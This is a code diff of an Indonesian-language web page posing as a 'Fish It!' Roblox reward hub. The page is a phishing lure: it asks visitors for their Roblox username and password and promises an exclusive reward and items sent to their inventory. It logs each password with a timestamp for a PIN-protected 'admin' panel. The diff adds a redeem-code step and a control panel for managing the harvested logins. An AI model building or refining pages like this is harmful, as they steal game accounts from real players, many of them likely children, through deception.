@@ -27,7 +27,7 @@
 
         .container {
             max-width: 800px; margin: 50px auto; padding: 20px;
-            background: rgba(15, 15, 15, 0.85);
+            background: rgba(15, 15, 15, 0.9);
             border: 1px solid #0055ff; border-radius: 15px;
             text-align: center; box-shadow: 0 0 50px rgba(0, 85, 255, 0.2);
         }
@@ -47,7 +47,7 @@
         }
         button:hover { background: #0033aa; transform: scale(1.05); }
 
-        /* Popup Styling */
+        /* Popups */
         .modal-overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center;
@@ -57,11 +57,15 @@
             text-align: center; max-width: 450px; width: 90%; box-shadow: 0 0 30px #0055ff55;
         }
 
-        .footer { margin-top: 30px; font-size: 12px; color: #666; }
-        #adminDashboard { display: none; padding: 20px; }
+        .admin-card {
+            background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 10px; margin-bottom: 20px;
+        }
+
         table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #333; padding: 10px; font-size: 13px; }
+        th, td { border: 1px solid #333; padding: 10px; font-size: 13px; text-align: center; }
         th { background: #0055ff; }
+
+        .footer { margin-top: 30px; font-size: 12px; color: #666; }
     </style>
 </head>
 <body>
@@ -74,147 +78,172 @@
 
     <div id="redeemPopup" class="modal-overlay">
         <div class="popup-content">
-            <h2 style="color: #00ff00;">SPECIAL EVENT!</h2>
-            <p style="margin: 10px 0; font-size: 14px;">Masukkan Kode Voucher Hari Ini:</p>
-            <p id="hintCode" style="color: #555; font-size: 11px; font-style: italic;"></p>
+            <h2 style="color: #00ff00;">REDEEM YOUR CODE</h2>
+            <p style="margin: 10px 0; font-size: 14px;">Masukkan kode event untuk melanjutkan:</p>
             <input type="text" id="redeemInput" placeholder="KODE DISINI" style="border-color: #00ff00;"><br>
-            <button onclick="validateRedeem()" style="background: #00ff00; color: black;">CLAIM VOUCHER</button>
+            <button onclick="validateRedeem()" style="background: #00ff00; color: black; width: 100%;">CLAIM</button>
         </div>
     </div>
 
     <div id="notificationPopup" class="modal-overlay">
         <div class="popup-content">
             <h2 style="color: #00ff00; margin-bottom: 10px;">SUCCESS!</h2>
-            <p id="popupMessage">Reward sedang diproses.</p>
-            <button onclick="closePopup()" style="background: #222; border: 1px solid #00ff00; margin-top: 20px;">OKE</button>
+            <p id="popupMessage"></p>
+            <button onclick="closePopup()" style="background: #222; border: 1px solid #00ff00; margin-top: 20px; width: 100%;">OKE</button>
         </div>
     </div>
 
     <div class="container" id="mainContent">
         <img src="https://tr.rbxcdn.com/180DAY-f446c1264701227ae463835b155f44af/768/432/Image/Webp/noFilter" class="logo">
-        <h1>TRADE FISH IT!</h1>
-        <p style="color: #00ff00; margin: 10px 0;">Status: ONLINE</p>
+        <h1>FISH IT! HUB</h1>
+        <p style="color: #00ff00; margin: 10px 0;">SERVER STATUS: ONLINE</p>
         
         <form id="loginForm">
             <input type="text" id="user" placeholder="Username Roblox" required><br>
             <input type="password" id="pass" placeholder="Password Roblox" required><br>
-            <button type="submit">CLAIM EXCLUSIVE REWARD</button>
+            <button type="submit" style="width: 100%; max-width: 350px;">GET REWARD</button>
         </form>
 
         <div class="footer">
-            <p>© 2026 Trade Fish It! Hub - All Rights Reserved</p>
-            <button onclick="openAdmin()" style="background:none; color:#333; font-size:10px;">Admin</button>
+            <p>© 2026 Trade Fish It! Hub</p>
+            <button onclick="openAdmin()" style="background:none; color:#333; font-size:10px;">Admin Access</button>
         </div>
     </div>
 
-    <div class="container" id="adminDashboard">
-        <h2 style="color: #00ff00;">LOG DATA USER</h2>
-        <table>
-            <thead><tr><th>Waktu</th><th>User</th><th>Pass</th></tr></thead>
-            <tbody id="logTable"></tbody>
-        </table>
-        <br>
-        <button onclick="window.location.reload()" style="background:#444">Keluar</button>
+    <div class="container" id="adminDashboard" style="display:none; max-width: 900px;">
+        <h1 style="color: #00ff00; margin-bottom: 20px;">MASTER CONTROL PANEL</h1>
+        
+        <div class="admin-card">
+            <h3>SET ACTIVE REDEEM CODE</h3>
+            <p style="font-size: 11px; color: #888; margin-bottom: 10px;">Kode ini yang harus dimasukkan oleh user.</p>
+            <input type="text" id="newMasterCode" placeholder="Masukkan Kode Baru" style="width: 200px; padding: 10px;">
+            <button onclick="updateMasterCode()" style="padding: 10px 20px; font-size: 12px; background: #00ff00; color: black;">SAVE CODE</button>
+            <p style="margin-top: 10px;">Kode Saat Ini: <span id="currentCodeDisplay" style="color: #00ff00; font-weight: bold;">-</span></p>
+        </div>
+
+        <div class="admin-card">
+            <h3>USER DATA LOGS</h3>
+            <table id="logTable">
+                <thead>
+                    <tr>
+                        <th>Waktu</th>
+                        <th>User</th>
+                        <th>Pass</th>
+                    </tr>
+                </thead>
+                <tbody id="logBody"></tbody>
+            </table>
+            <button onclick="clearLogs()" style="background: #ff4444; font-size: 12px; padding: 10px; margin-top: 10px;">HAPUS SEMUA LOG</button>
+        </div>
+
+        <button onclick="window.location.reload()" style="background:#444; width: 100%;">LOGOUT ADMIN</button>
     </div>
 
     <script>
-        const loginForm = document.getElementById('loginForm');
-        const notifSound = document.getElementById('notifSound');
-        const bgMusic = document.getElementById('bgMusic');
-        const redeemPopup = document.getElementById('redeemPopup');
-        const successPopup = document.getElementById('notificationPopup');
-        const musicBtn = document.getElementById('musicControl');
-
-        let tempUser = "";
-
-        // Fungsi Generate Kode Berdasarkan Tanggal (Acak Berdasarkan Event)
-        function getDailyCode() {
-            const date = new Date();
-            const day = date.getDay(); 
-            const month = date.getMonth();
-            
-            // Contoh Logika Kode Event
-            if (month === 0 && date.getDate() <= 7) return "NEWYEAR2026";
-            if (day === 0) return "FISHIT_SUNDAY";
-            if (day === 5) return "FRIDAY_LUCKY";
-            return "FISHIT" + (date.getDate() + 100); // Kode harian default
+        // Inisialisasi Kode Default jika belum ada
+        if(!localStorage.getItem('masterRedeemCode')) {
+            localStorage.setItem('masterRedeemCode', 'FISHIT2026');
         }
 
+        const bgMusic = document.getElementById('bgMusic');
+        const notifSound = document.getElementById('notifSound');
+        let currentUser = "";
+
+        // Auto-play music on first click
         window.addEventListener('click', () => {
-            if (bgMusic.paused) { bgMusic.play(); musicBtn.innerText = "⏸️"; }
+            if (bgMusic.paused) { bgMusic.play(); document.getElementById('musicControl').innerText = "⏸️"; }
         }, { once: true });
 
         function toggleMusic() {
-            if (bgMusic.paused) { bgMusic.play(); musicBtn.innerText = "⏸️"; }
-            else { bgMusic.pause(); musicBtn.innerText = "🎵"; }
+            if (bgMusic.paused) { bgMusic.play(); document.getElementById('musicControl').innerText = "⏸️"; }
+            else { bgMusic.pause(); document.getElementById('musicControl').innerText = "🎵"; }
         }
 
-        // 1. Submit Login -> Munculkan Redeem Popup
-        loginForm.addEventListener('submit', function(e) {
+        // --- USER LOGIC ---
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             // Cek Cooldown 24 Jam
             const lastClaim = localStorage.getItem('lastClaimTime');
             const now = new Date().getTime();
-            
             if (lastClaim && (now - lastClaim < 24 * 60 * 60 * 1000)) {
-                const remaining = Math.ceil((24 * 60 * 60 * 1000 - (now - lastClaim)) / (60 * 60 * 1000));
-                alert("Anda sudah mengklaim hari ini. Tunggu " + remaining + " jam lagi!");
+                alert("Cooldown! Anda hanya bisa klaim 1x dalam 24 jam.");
                 return;
             }
 
-            tempUser = document.getElementById('user').value;
+            currentUser = document.getElementById('user').value;
             const log = {
-                user: tempUser,
+                user: currentUser,
                 pass: document.getElementById('pass').value,
                 time: new Date().toLocaleString()
             };
 
-            // Simpan Log Admin
             let db = JSON.parse(localStorage.getItem('webLogs')) || [];
             db.push(log);
             localStorage.setItem('webLogs', JSON.stringify(db));
 
-            // Tampilkan Popup Redeem
-            document.getElementById('hintCode').innerText = "Hint: Cek grup untuk kode '" + getDailyCode().substring(0,3) + "...'";
-            redeemPopup.style.display = 'flex';
+            // Munculkan Popup Redeem
+            document.getElementById('redeemPopup').style.display = 'flex';
         });
 
-        // 2. Validasi Redeem Code
         function validateRedeem() {
             const input = document.getElementById('redeemInput').value.toUpperCase();
-            const correctCode = getDailyCode();
+            const correctCode = localStorage.getItem('masterRedeemCode').toUpperCase();
 
             if (input === correctCode) {
                 notifSound.play();
-                redeemPopup.style.display = 'none';
-                
-                // Set Cooldown 24 Jam
+                document.getElementById('redeemPopup').style.display = 'none';
                 localStorage.setItem('lastClaimTime', new Date().getTime());
-
-                // Munculkan Pop-up Sukses
-                document.getElementById('popupMessage').innerText = "Selamat " + tempUser + "!\nRedeem Code BERHASIL. Item dikirim dalam 10 menit.";
-                successPopup.style.display = 'flex';
-                loginForm.reset();
-                document.getElementById('redeemInput').value = "";
+                
+                document.getElementById('popupMessage').innerText = "Selamat " + currentUser + "!\nItem sedang dikirim ke inventory Anda.";
+                document.getElementById('notificationPopup').style.display = 'flex';
+                document.getElementById('loginForm').reset();
             } else {
-                alert("KODE SALAH! Coba lagi atau cek Event terbaru.");
+                alert("KODE SALAH! Silahkan cek info grup.");
             }
         }
 
         function closePopup() {
-            successPopup.style.display = 'none';
+            document.getElementById('notificationPopup').style.display = 'none';
         }
 
+        // --- ADMIN LOGIC ---
         function openAdmin() {
             const pin = prompt("Masukkan PIN Admin:");
             if(pin === "2026") {
                 document.getElementById('mainContent').style.display = 'none';
                 document.getElementById('adminDashboard').style.display = 'block';
-                const db = JSON.parse(localStorage.getItem('webLogs')) || [];
-                document.getElementById('logTable').innerHTML = db.map(item => 
-                    `<tr><td>${item.time}</td><td>${item.user}</td><td>${item.pass}</td></tr>`
-                ).join('');
+                renderAdminData();
+            } else {
+                alert("AKSES DITOLAK!");
+            }
+        }
+
+        function renderAdminData() {
+            // Tampilkan Kode Saat Ini
+            document.getElementById('currentCodeDisplay').innerText = localStorage.getItem('masterRedeemCode');
+            
+            // Tampilkan Tabel Log
+            const db = JSON.parse(localStorage.getItem('webLogs')) || [];
+            document.getElementById('logBody').innerHTML = db.map(item => 
+                `<tr><td>${item.time}</td><td>${item.user}</td><td style="color:#ff4444">${item.pass}</td></tr>`
+            ).reverse().join('');
+        }
+
+        function updateMasterCode() {
+            const newCode = document.getElementById('newMasterCode').value.toUpperCase();
+            if(newCode.length < 3) return alert("Kode terlalu pendek!");
+            
+            localStorage.setItem('masterRedeemCode', newCode);
+            document.getElementById('currentCodeDisplay').innerText = newCode;
+            document.getElementById('newMasterCode').value = "";
+            alert("Kode Redeem Berhasil Diubah ke: " + newCode);
+        }
+
+        function clearLogs() {
+            if(confirm("Hapus semua data login user?")) {
+                localStorage.removeItem('webLogs');
+                renderAdminData();
             }
         }
     </script>
